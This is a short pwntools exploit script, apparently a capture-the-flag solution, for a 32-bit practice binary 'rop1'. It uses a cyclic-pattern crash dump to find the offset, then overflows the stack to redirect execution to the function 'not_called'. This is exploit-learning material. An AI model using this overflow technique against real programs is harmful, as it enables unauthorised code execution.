#!/usr/bin/env python2

from pwn import *

context(os = 'linux', arch = 'i386', terminal = 'xterm')
binary = 'rop1'

debug = False
crash = False

if 'DEBUG' in args:
    debug = True
    context.log_level = 0

if 'CRASH' in args:
    crash = True
    debug = True

elf = ELF(binary)

#    EAX: 0xffced1fc ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa_\322\316\377vaaawaaaxaaayaa\314zaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
#    EBX: 0x0 
#    ECX: 0xffcedc00 ("yaab")
#    EDX: 0xffced2c0 ("yaab")
#    ESI: 0x2 
#    EDI: 0xf777a000 --> 0x1b4d90 
#    EBP: 0x62616163 ('caab')
#    ESP: 0xffced270 ("eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
#    EIP: 0x62616164 ('daab')
payload =  "A"*(cyclic_find(0x62616163))
payload += "BBBB"          # fake ret address
payload += p32(elf.symbols['not_called']) # 0x804846b

if crash:
    payload = cyclic(200)

if debug:
    r = gdb.debug([binary, payload])
    #gdb.attach(r)
    pause()
    sys.exit(0)
else:
    r = process(binary + " " + payload, shell=True)

r.clean()
r.interactive()

